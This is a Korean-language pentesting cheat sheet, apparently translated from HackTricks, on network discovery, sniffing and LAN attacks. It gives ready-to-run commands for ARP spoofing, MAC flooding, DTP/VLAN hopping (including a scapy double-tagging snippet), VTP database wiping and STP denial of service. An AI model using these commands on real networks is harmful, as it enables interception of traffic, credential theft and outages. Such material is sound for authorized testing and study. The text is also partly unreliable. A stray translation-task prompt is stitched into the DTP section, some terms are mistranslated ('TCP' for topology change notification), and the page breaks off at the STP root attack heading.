# Pentesting Network

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* 회사를 **HackTricks에서 광고**하거나 **PDF로 HackTricks 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 자신의 해킹 기법을 공유하세요.

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**버그 바운티 팁**: 해커들이 만든 프리미엄 **버그 바운티 플랫폼인 Intigriti에 가입**하세요! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 가입하고 최대 **$100,000**의 바운티를 받으세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

## 외부에서 호스트 찾기

이것은 **인터넷에서 응답하는 IP를 찾는** 간단한 섹션입니다.\
이 상황에서는 몇 개의 **IP 범위**가 있을 수 있으며, **어떤 IP가 응답하는지** 찾기만 하면 됩니다.

### ICMP

호스트가 작동 중인지 여부를 확인하는 가장 **쉽고 빠른** 방법입니다.\
일부 **ICMP** 패킷을 보내고 **응답을 기대**할 수 있습니다. 가장 쉬운 방법은 **에코 요청**을 보내고 응답을 기다리는 것입니다. 간단한 `ping` 또는 **범위**에 대해 `fping`을 사용하여 수행할 수 있습니다.\
또한 **nmap**을 사용하여 일반적인 ICMP 에코 요청-응답에 대한 필터를 피하기 위해 다른 유형의 ICMP 패킷을 보낼 수도 있습니다.

```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```

### TCP 포트 탐지

모든 종류의 ICMP 패킷이 필터링되는 경우가 매우 흔합니다. 그런 경우에는 호스트가 작동 중인지 확인하기 위해 **열린 포트를 찾아보는 것**이 가능합니다. 각 호스트에는 **65535개의 포트**가 있으므로, "큰" 범위를 가지고 있다면 각 호스트의 **각 포트**가 열려 있는지 여부를 테스트할 수 없습니다. 그렇게 하면 너무 많은 시간이 소요됩니다.\
따라서, 필요한 것은 **빠른 포트 스캐너**([masscan](https://github.com/robertdavidgraham/masscan))와 **가장 많이 사용되는 포트 목록**입니다:

```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```

이 단계는 `nmap`을 사용하여 수행할 수도 있지만, 그것은 느리고 호스트를 식별하는 데 문제가 있습니다.

### HTTP 포트 탐지

이것은 HTTP 서비스를 발견하는 데 유용한 TCP 포트 탐지입니다.

```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```

### UDP 포트 탐지

**호스트에 더 많은 관심을 기울여야 할지** 결정하기 위해 **UDP 포트가 열려 있는지** 확인해 볼 수도 있습니다. 일반적인 빈 UDP 프로브 패킷에 대해 UDP 서비스는 보통 **어떤 데이터도 응답하지 않기 때문에** 포트가 필터링되었는지 아니면 열려 있는지 알기 어렵습니다. 이를 결정하는 가장 쉬운 방법은 실행 중인 서비스와 관련된 패킷을 보내는 것인데, 실행 중인 서비스를 알지 못하기 때문에 포트 번호를 기반으로 가장 가능성이 높은 서비스를 시도해 보아야 합니다:

```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```

이전에 제안된 nmap 명령은 **/24** 범위 내의 모든 호스트에서 **상위 1000개의 UDP 포트**를 테스트하지만, 이 작업만으로도 **20분 이상** 소요됩니다. 더 **빠른 결과**가 필요한 경우 [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)를 사용할 수 있습니다: `./udp-proto-scanner.pl 199.66.11.53/24` 이렇게 하면 이러한 **UDP 프로브**가 **예상 포트**로 전송됩니다 (/24 범위에 대해서는 1분만 소요됩니다): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP 포트 탐지

```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```

## Wifi 해킹

여기에서는 작성 시점의 모든 잘 알려진 Wifi 공격에 대한 좋은 가이드를 찾을 수 있습니다:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## 내부에서 호스트 발견하기

네트워크 내부에 있다면 가장 먼저 해야 할 일은 **다른 호스트를 발견**하는 것입니다. **얼마나 많은 소음**을 만들고 싶은지에 따라 다른 작업을 수행할 수 있습니다:

### 수동

다음 도구를 사용하여 연결된 네트워크 내부에서 호스트를 수동으로 발견할 수 있습니다:

```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```

### Active

주의할 점은 [_**외부에서 호스트 찾기**_](./#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP 포트 찾기_)에서 설명한 기법들을 여기에도 **적용할 수 있다는 것**입니다.\
하지만, 다른 호스트와 **동일한 네트워크**에 있기 때문에 **더 많은 작업**을 수행할 수 있습니다:

```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```

### Active ICMP

_외부에서 호스트를 발견하는_ 기술에 대한 설명은 [_**ICMP**_](./#icmp)에서 주석으로 설명되어 있습니다.\
하지만, 다른 호스트와 **동일한 네트워크**에 있기 때문에 **더 많은 작업**을 수행할 수 있습니다:

* **서브넷 브로드캐스트 주소**를 **핑**하면 핑이 **각 호스트**에 도달하고 그들이 **응답**할 수 있습니다: `ping -b 10.10.5.255`
* **네트워크 브로드캐스트 주소**를 핑하면 **다른 서브넷** 내의 호스트를 찾을 수도 있습니다: `ping -b 255.255.255.255`
* `nmap`의 `-PE`, `-PP`, `-PM` 플래그를 사용하여 호스트 탐지를 수행할 수 있습니다. 각각 **ICMPv4 echo**, **timestamp**, **서브넷 마스크 요청**을 보내는 것입니다: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan은 **네트워크 메시지**를 통해 컴퓨터를 **켜는 데 사용**됩니다. 컴퓨터를 켜기 위해 사용되는 매직 패킷은 **MAC Dst**가 제공되고 그 후에 동일한 패킷 내에서 **16번 반복**됩니다.\
그런 다음 이러한 종류의 패킷은 일반적으로 **이더넷 0x0842** 또는 **포트 9로의 UDP 패킷**으로 전송됩니다.\
만약 \*\*\[MAC]\*\*이 제공되지 않으면, 패킷은 **브로드캐스트 이더넷**으로 전송됩니다 (브로드캐스트 MAC이 반복됩니다).

```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```

## 호스트 스캐닝

깊이 있는 스캔을 원하는 모든 IP(외부 또는 내부)를 발견한 후에는 다양한 작업을 수행할 수 있습니다.

### TCP

* **열린** 포트: _SYN --> SYN/ACK --> RST_
* **닫힌** 포트: _SYN --> RST/ACK_
* **필터링된** 포트: _SYN --> \[응답 없음]_
* **필터링된** 포트: _SYN --> ICMP 메시지_

```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```

### UDP

UDP 포트를 스캔하는 두 가지 옵션이 있습니다:

* UDP 패킷을 보내고, 포트가 **닫혀 있다면** 응답으로 \_**ICMP unreachable**\_을 확인합니다 (여러 경우에 ICMP가 **필터링**되어 포트가 열려 있거나 닫혀 있는지에 대한 정보를 받지 못할 수도 있습니다).
* **포맷된 데이터그램**을 보내어 **서비스**로부터 응답을 유도합니다 (예: DNS, DHCP, TFTP 등, \_nmap-payloads\_에 명시된 다른 서비스들). 응답을 받으면, 포트는 **열려 있습니다**.

**Nmap**은 "-sV"를 사용하여 두 옵션을 **혼합**합니다 (UDP 스캔은 매우 느립니다), 하지만 UDP 스캔은 TCP 스캔보다 느립니다:

```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```

### SCTP 스캔

\*\*SCTP (Stream Control Transmission Protocol)\*\*은 \*\*TCP (Transmission Control Protocol)\*\*와 \*\*UDP (User Datagram Protocol)\*\*와 함께 사용되도록 설계되었습니다. 주요 목적은 IP 네트워크 상에서 전화 데이터의 전송을 용이하게 하는 것으로, \*\*Signaling System 7 (SS7)\*\*에서 발견되는 신뢰성 기능을 많이 반영합니다. **SCTP**는 SS7 신호를 IP 네트워크 상에서 전송하기 위한 목적으로 설계된 **SIGTRAN** 프로토콜 패밀리의 핵심 구성 요소입니다.

**SCTP**는 **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, **VxWorks**와 같은 다양한 운영 체제에서 지원되므로, 통신 및 네트워킹 분야에서의 광범위한 수용과 유용성을 나타냅니다.

nmap에서는 SCTP에 대해 두 가지 다른 스캔 옵션을 제공합니다: \_-sY\_와 _-sZ_

```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```

### IDS 및 IPS 회피

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **더 많은 nmap 옵션**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### 내부 IP 주소 공개

**구성이 잘못된 라우터, 방화벽 및 네트워크 장치**는 때때로 **비공개 소스 주소**를 사용하여 네트워크 프로브에 응답합니다. **tcpdump**를 사용하여 테스트 중에 개인 주소에서 수신된 패킷을 식별할 수 있습니다. 특히 Kali Linux에서는 공개 인터넷에서 액세스할 수 있는 **eth2 인터페이스**에서 패킷을 캡처할 수 있습니다. 설정이 NAT 또는 방화벽 뒤에 있는 경우 이러한 패킷은 필터링될 수 있음을 유의해야 합니다.

```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```

## 스니핑

스니핑을 통해 캡처된 프레임과 패킷을 검토함으로써 IP 범위, 서브넷 크기, MAC 주소 및 호스트 이름에 대한 세부 정보를 알 수 있습니다. 네트워크가 잘못 구성되었거나 스위칭 패브릭이 과부하 상태인 경우, 공격자는 수동 네트워크 스니핑을 통해 민감한 자료를 캡처할 수 있습니다.

스위칭된 이더넷 네트워크가 올바르게 구성된 경우, 브로드캐스트 프레임과 자신의 MAC 주소로 전송되는 자료만 볼 수 있습니다.

### TCPDump

```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```

또한, Wireshark를 GUI로 사용하여 SSH 세션을 통해 원격 컴퓨터에서 실시간으로 패킷을 캡처할 수 있습니다.

```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```

### Bettercap

Bettercap은 네트워크 펜테스팅 도구로, 중간자 공격 및 네트워크 스니핑과 같은 다양한 기능을 제공합니다. 이 도구를 사용하면 네트워크 트래픽을 감시하고 조작할 수 있으며, 사용자 인증 정보를 획득하거나 세션을 탈취할 수 있습니다. Bettercap은 ARP 스푸핑, DNS 스푸핑, SSL 스트립 등과 같은 공격 기법을 사용하여 네트워크 보안 취약점을 식별하고 악용할 수 있습니다.

#### 설치 및 사용법

Bettercap은 다양한 운영 체제에서 사용할 수 있으며, 설치 및 사용법은 다음과 같습니다:

1. Bettercap을 다운로드하고 설치합니다.
2. 필요한 패키지 및 종속성을 설치합니다.
3. Bettercap을 실행하고 네트워크 인터페이스를 선택합니다.
4. 공격 기법과 옵션을 설정하여 공격을 실행합니다.

#### 주요 기능

Bettercap은 다음과 같은 주요 기능을 제공합니다:

* 중간자 공격: ARP 스푸핑, DNS 스푸핑 등을 사용하여 네트워크 트래픽을 중간에서 가로채고 조작할 수 있습니다.
* 네트워크 스니핑: 네트워크 트래픽을 감시하고 패킷을 분석할 수 있습니다.
* SSL 스트립: HTTPS 통신에서 암호화를 제거하여 사용자 인증 정보를 획득할 수 있습니다.
* 세션 탈취: 사용자의 세션을 탈취하여 권한 상승 등의 공격을 수행할 수 있습니다.

#### 주의사항

Bettercap은 합법적인 목적으로 사용되어야 하며, 불법적인 활동에 사용해서는 안 됩니다. Bettercap을 사용할 때에는 관련 법률과 규정을 준수해야 합니다.

```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```

### Wireshark

당연하게도.

### 자격 증명 캡처

[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz)와 같은 도구를 사용하여 pcap 또는 실시간 인터페이스에서 자격 증명을 구문 분석할 수 있습니다.

## LAN 공격

### ARP 스푸핑

ARP 스푸핑은 우리의 장치의 MAC 주소를 가진 기계의 IP를 나타내기 위해 무료 ARP 응답을 보내는 것입니다. 그런 다음 피해자는 ARP 테이블을 변경하고 IP 스푸핑을 연락하려고 할 때마다 우리의 기계에 연락할 것입니다.

#### **Bettercap**

```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```

#### **Arpspoof**

Arpspoof는 네트워크 내에서 ARP 프로토콜을 이용하여 중간자 공격을 수행하는 도구입니다. 이 도구를 사용하면 공격자는 네트워크 상의 다른 호스트들에게 자신이 다른 호스트의 IP 주소에 해당하는 MAC 주소를 가지고 있다고 속일 수 있습니다. 이를 통해 공격자는 네트워크 트래픽을 가로채고 조작할 수 있습니다.

Arpspoof는 일반적으로 스니핑, 세션 하이재킹, 중간자 공격 등 다양한 공격 시나리오에서 사용됩니다. 이 도구를 사용하여 공격자는 네트워크 상의 다른 사용자들의 통신을 감시하거나 조작할 수 있습니다. 그러나 이 도구는 합법적인 목적으로 사용되기도 하며, 보안 전문가들은 네트워크 보안 강화를 위해 이 도구를 사용하기도 합니다.

Arpspoof를 사용하기 위해서는 공격자는 네트워크 상의 다른 호스트들과 동일한 네트워크에 연결되어 있어야 합니다. 또한, 공격자는 관리자 권한을 가진 시스템에서 이 도구를 실행해야 합니다. 이 도구는 일반적으로 Kali Linux와 같은 보안 도구를 포함한 다양한 플랫폼에서 사용할 수 있습니다.

Arpspoof를 사용하여 중간자 공격을 수행하기 위해서는 몇 가지 단계를 따라야 합니다. 먼저, 공격자는 자신의 시스템을 네트워크 상의 게이트웨이로 설정해야 합니다. 그런 다음, 공격자는 ARP 패킷을 사용하여 다른 호스트들에게 자신의 MAC 주소를 가짜로 전달합니다. 이렇게 하면 다른 호스트들은 공격자를 게이트웨이로 인식하고 모든 트래픽을 공격자를 통해 전달하게 됩니다.

중간자 공격을 수행하는 동안, 공격자는 네트워크 트래픽을 가로채고 조작할 수 있습니다. 예를 들어, 공격자는 패킷 스니핑을 통해 사용자의 개인 정보를 탈취하거나, 세션 하이재킹을 통해 사용자의 인증 정보를 도용할 수 있습니다. 이러한 공격은 네트워크 보안 취약점을 확인하고 보완하기 위해 사용될 수 있습니다.

중간자 공격은 네트워크 보안에 대한 이해와 적절한 권한을 가진 사람들에 의해 사용되어야 합니다. 불법적인 목적으로 이 도구를 사용하는 것은 법적인 문제를 일으킬 수 있으며, 다른 사람들의 개인 정보를 침해할 수 있습니다. 따라서, 이 도구를 사용할 때는 항상 법적인 규정을 준수하고, 합법적인 목적으로 사용해야 합니다.

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```

### MAC Flooding - CAM 오버플로우

다른 소스 MAC 주소를 가진 많은 패킷을 보내 스위치의 CAM 테이블을 오버플로우시킵니다. CAM 테이블이 가득 차면 스위치는 허브처럼 동작하여 모든 트래픽을 브로드캐스팅합니다.

```bash
macof -i <interface>
```

현대 스위치에서는 이 취약점이 수정되었습니다.

### 802.1Q VLAN / DTP 공격

#### 동적 트렁크

\*\*동적 트렁크 프로토콜(DTP)\*\*은 트렁크를 자동으로 선택할 수 있는 링크 계층 프로토콜로 설계되었습니다. 이를 통해 스위치는 자동으로 트렁크 모드(Trunk) 또는 비트렁크 모드를 위한 포트를 선택할 수 있습니다. **DTP**의 배포는 종종 최적화되지 않은 네트워크 디자인을 나타내는 것으로 간주되며, 필요한 경우에만 트렁크를 수동으로 구성하고 적절한 문서화를 보장하는 것이 중요합니다.

기본적으로 스위치 포트는 동적 자동 모드로 설정되어 있으며, 이는 인접한 스위치에 의해 트렁크 모드로 설정되는 경우 트렁크를 초기화할 준비가 되어 있다는 의미입니다. 펜테스터나 공격자가 스위치에 연결하고 DTP Desirable 프레임을 보내면, 포트가 트렁크 모드로 전환됩니다. 이 작업을 통해 공격자는 STP 프레임 분석을 통해 VLAN을 열거하고 가상 인터페이스를 설정하여 VLAN 분할을 우회할 수 있습니다.

많은 스위치에서 기본적으로 DTP가 존재하기 때문에, 이를 악용하여 공격자는 스위치의 동작을 모방하여 모든 VLAN을 통해 트래픽에 접근할 수 있습니다. [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) 스크립트는 인터페이스를 모니터링하여 스위치가 기본, 트렁크, 동적, 자동 또는 액세스 모드 중 어느 모드인지 확인하는 데 사용됩니다. 후자는 VLAN 호핑 공격에 면역인 유일한 구성입니다. 이 도구는 스위치의 취약성 상태를 평가합니다.

네트워크 취약성이 확인된 경우, _**Yersinia**_ 도구를 사용하여 DTP 프로토콜을 통해 "트렁킹을 활성화"시킬 수 있으며, 이를 통해 모든 VLAN의 패킷을 관찰할 수 있습니다.

```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```

![](<../../.gitbook/assets/image (646) (1).png>)

VLAN을 열거하기 위해서는 [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)\*\* 스크립트를 사용하여 DTP Desirable 프레임을 생성할 수도 있습니다.\*\* 어떤 상황에서도 스크립트를 중단하지 마십시오. 이는 3초마다 DTP Desirable을 주입합니다. **스위치에서 동적으로 생성된 트렁크 채널은 5분 동안만 유지됩니다. 5분이 지나면 트렁크가 해제됩니다.**

```
sudo python3 DTPHijacking.py --interface eth0
```

다음은 해킹 기법에 관한 해킹 책의 내용입니다. 다음 내용은 파일 /hive/hacktricks/generic-methodologies-and-resources/pentesting-network/README.md에서 가져온 것입니다. 관련된 영어 텍스트를 한국어로 번역하고, 정확히 동일한 마크다운 및 HTML 구문을 유지한 채 번역을 반환하세요. 코드, 해킹 기법 이름, 해킹 관련 용어, 클라우드/SaaS 플랫폼 이름(예: Workspace, aws, gcp...)과 같은 단어, 'leak'이라는 단어, pentesting, 마크다운 태그와 같은 것들은 번역하지 마세요. 또한 번역과 마크다운 구문 이외의 추가적인 내용은 추가하지 마세요.

\*\*Access/Desirable (0x03)\*\*은 DTP 프레임이 원하는 유형인 Desirable 유형임을 나타내며, 이는 포트가 Trunk 모드로 전환되도록 지시합니다. 그리고 **802.1Q/802.1Q (0xa5**)은 **802.1Q** 캡슐화 유형을 나타냅니다.

STP 프레임을 분석함으로써, **VLAN 30과 VLAN 60의 존재를 알 수 있습니다.**

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### 특정 VLAN 공격

VLAN ID와 IP 값이 알려진 경우, **특정 VLAN을 공격하기 위해 가상 인터페이스를 구성**할 수 있습니다.\
DHCP가 사용 불가능한 경우, \_ifconfig\_를 사용하여 정적 IP 주소를 설정하세요.

```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```

#### 자동 VLAN Hopper

**동적 트렁크 및 가상 인터페이스 생성 및 다른 VLAN 내의 호스트 탐색**에 대한 논의된 공격은 [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger) 도구를 통해 **자동으로 수행**됩니다.

#### 이중 태깅

공격자가 피해 호스트의 **MAC, IP 및 VLAN ID 값을 알고 있다면**, 해당 호스트의 VLAN과 피해자의 VLAN을 **이중 태깅된 프레임**에 적용하고 패킷을 보낼 수 있습니다. 피해자는 공격자와 연결할 수 없으므로, 공격자에게는 **UDP를 통해 통신하는 것이 가장 좋은 옵션**입니다. 이를 통해 일부 흥미로운 작업을 수행할 수 있는 프로토콜(SNMP와 같은)로 통신할 수 있습니다.

공격자의 다른 옵션은, 공격자가 제어하고 피해자가 접근할 수 있는 IP를 위조하여 **TCP 포트 스캔을 실행**하는 것입니다. 그런 다음, 공격자는 자신이 소유한 두 번째 호스트에서 피해자로부터 패킷을 수신하는지 확인할 수 있습니다.

![](<../../.gitbook/assets/image (635) (1).png>)

이 공격을 수행하기 위해 scapy를 사용할 수 있습니다: `pip install scapy`

```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```

#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

만약 **직접 연결된 스위치에 액세스할 수 있다면**, 네트워크 내에서 **VLAN 분할을 우회**할 수 있습니다. 간단히 포트를 트렁크 모드로 전환하고 대상 VLAN의 가상 인터페이스를 생성한 다음 IP 주소를 구성하면 됩니다. 주소를 동적으로 요청할 수도 있고 정적으로 구성할 수도 있습니다. 상황에 따라 다릅니다.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Layer 3 Private VLAN Bypass

게스트 무선 네트워크와 같은 특정 환경에서는 클라이언트 간 직접 통신을 방지하기 위해 **포트 격리(또는 개인 VLAN)** 설정이 구현됩니다. 그러나 이러한 격리 조치를 우회할 수 있는 기술이 발견되었습니다. 이 기술은 네트워크 ACL의 부재 또는 부적절한 구성을 악용하여 IP 패킷을 라우터를 통해 다른 클라이언트에게 라우팅할 수 있게 합니다.

이 공격은 목적 클라이언트의 IP 주소를 가진 패킷을 생성하되 라우터의 MAC 주소를 사용하여 실행됩니다. 이로 인해 라우터는 패킷을 잘못된 대상 클라이언트로 전달하게 됩니다. 이 접근 방식은 Double Tagging Attacks에서 사용되는 방식과 유사하며, 피해자에게 접근 가능한 호스트를 제어하여 보안 결함을 악용하는 데 사용됩니다.

**공격의 주요 단계:**

1. **패킷 생성:** 목적 클라이언트의 IP 주소를 가진 패킷을 특별히 생성합니다. 이때 라우터의 MAC 주소를 사용합니다.
2. **라우터 동작 악용:** 생성된 패킷이 라우터로 전송되며, 설정에 따라 라우터는 패킷을 대상 클라이언트로 리디렉션하여 개인 VLAN 설정이 제공하는 격리를 우회합니다.

### VTP 공격

VTP (VLAN Trunking Protocol)는 VLAN 관리를 중앙화합니다. VLAN 데이터베이스의 무결성을 유지하기 위해 리비전 번호를 사용합니다. 수정이 발생할 때마다 이 번호가 증가하며, 스위치는 더 높은 리비전 번호의 구성을 채택하여 자체 VLAN 데이터베이스를 업데이트합니다.

#### VTP 도메인 역할

* **VTP 서버:** VLAN을 관리합니다. VLAN을 생성, 삭제, 수정합니다. 도메인 멤버에게 VTP 알림을 브로드캐스트합니다.
* **VTP 클라이언트:** VTP 알림을 받아 VLAN 데이터베이스를 동기화합니다. 이 역할은 로컬 VLAN 구성 수정이 제한됩니다.
* **VTP 투명:** VTP 업데이트에 참여하지 않지만 VTP 알림을 전달합니다. VTP 공격에 영향을 받지 않으며, 리비전 번호는 항상 0으로 유지됩니다.

#### VTP 광고 유형

* **요약 광고:** VTP 서버가 300초마다 브로드캐스트하는 도메인 정보를 전달합니다.
* **하위 집합 광고:** VLAN 구성 변경 후 전송됩니다.
* **광고 요청:** VTP 클라이언트가 요약 광고를 요청하기 위해 발행하는 것으로, 일반적으로 더 높은 구성 리비전 번호를 감지한 경우에 응답합니다.

VTP 취약점은 VTP 알림이 트렁크 포트를 통해만 순환되기 때문에 트렁크 포트를 통해서만 악용할 수 있습니다. DTP 이후의 공격 시나리오는 VTP로 전환될 수 있습니다. Yersinia와 같은 도구는 VTP 공격을 용이하게 할 수 있으며, 이를 통해 VLAN 데이터베이스를 삭제하여 네트워크를 효과적으로 중단시킬 수 있습니다.

참고: 이 토론은 VTP 버전 1 (VTPv1)에 해당합니다.

````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````

Yersinia의 그래픽 모드에서 VLAN 데이터베이스를 정리하기 위해 모든 VTP VLAN 옵션을 선택하십시오.

### STP 공격

**인터페이스에서 BPDU 프레임을 캡처할 수 없는 경우 STP 공격에 성공할 가능성은 적습니다.**

#### **STP BPDU DoS**

많은 양의 BPDUs TCP (Topology Change Notification) 또는 Conf (토폴로지가 생성될 때 전송되는 BPDUs)를 보내면 스위치가 과부하되어 올바르게 작동하지 않게 됩니다.

```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```

#### **STP TCP 공격**

TCP가 전송되면 스위치의 CAM 테이블은 15초 후에 삭제됩니다. 그런 다음 이러한 종류의 패킷을 계속해서 보내면 CAM 테이블이 계속 재시작됩니다 (또는 매 15초마다) 그리고 재시작되면 스위치는 허브처럼 동작합니다.

```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```

#### **STP 루트 공격**

